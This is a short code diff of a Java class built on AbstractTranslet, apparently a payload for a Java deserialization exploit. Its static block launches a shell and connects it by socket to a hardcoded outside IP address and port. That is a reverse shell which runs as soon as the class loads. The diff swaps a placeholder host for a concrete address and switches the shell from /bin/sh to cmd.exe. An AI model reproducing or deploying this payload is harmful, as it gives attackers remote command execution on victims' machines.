@@ -13,10 +13,10 @@ import java.net.Socket;
 public class MyClassLoader2_3 extends AbstractTranslet {
     static {
         try{
-            String host="49.x.y.z";
-            int port=8888;
-//            String cmd="cmd.exe";
-            String cmd="/bin/sh";
+            String host="49.232.174.29";
+            int port=8866;
+            String cmd="cmd.exe";
+//            String cmd="/bin/sh";
             Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
             Socket s=new Socket(host,port);
             InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
